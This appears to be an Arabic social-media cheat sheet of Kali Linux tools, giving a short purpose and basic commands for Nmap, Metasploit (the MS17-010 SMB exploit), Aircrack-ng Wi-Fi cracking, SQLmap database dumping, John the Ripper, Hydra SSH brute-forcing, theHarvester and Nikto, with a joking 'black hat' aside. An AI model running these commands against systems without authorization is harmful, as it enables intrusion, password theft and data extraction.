📘 دليل أدوات Kali Linux

لا تنسَ الطقم الأسود 😉

🔍 Nmap – فحص الشبكات

يُستخدم لاكتشاف الأجهزة والمنافذ والخدمات على الشبكة.

nmap 192.168.1.1 nmap -sS 192.168.1.1 nmap -O 192.168.1.1 nmap -p 80,443 192.168.1.1

🧨 Metasploit – استغلال الثغرات

أداة قوية لتنفيذ هجمات على ثغرات أمنية معروفة.

msfconsole search exploit use exploit/windows/smb/ms17_010 set RHOST 192.168.1.5 exploit

📡 Aircrack-ng – اختراق Wi-Fi

للتقاط الحزم وكسر كلمات مرور الشبكات اللاسلكية.

airmon-ng start wlan0 airodump-ng wlan0mon aircrack-ng -w wordlist.txt file.cap

🕸️ SQLmap – حقن قواعد البيانات

يكتشف وينفذ هجمات SQL Injection على تطبيقات الويب.

sqlmap -u "http://site.com/page.php?id=1" --dbs sqlmap -u "..." --dump

🔐 John the Ripper – كسر كلمات المرور

يفك تشفير كلمات المرور باستخدام ملفات كلمات.

john --wordlist=rockyou.txt hash.txt john --show hash.txt

🌐 Burp Suite – اختبار تطبيقات الويب

يعمل كوكيل لتحليل الطلبات والاستجابات بين المتصفح والخادم.

يُشغل من القائمة الرسومية ويُستخدم مع إعدادات البروكسي.

🧠 Hydra – كسر كلمات المرور عبر الشبكة

ينفذ هجمات brute-force على بروتوكولات مثل SSH وFTP.

hydra -l admin -P wordlist.txt ssh://192.168.1.5

🕵️ theHarvester – جمع معلومات استخبارية

يجمع بيانات عن نطاق معين مثل البريد الإلكتروني وIP.

theHarvester -d example.com -b google

🧬 Maltego – تحليل العلاقات والروابط

ينشئ خرائط بيانية للعلاقات بين الأشخاص والنطاقات.

يُشغل من القائمة الرسومية ويُستخدم عبر واجهة سحب وإفلات.

🧪 Nikto – فحص أمان خوادم الويب

يكتشف ثغرات في إعدادات السيرفرات.

nikto -h http://example.com
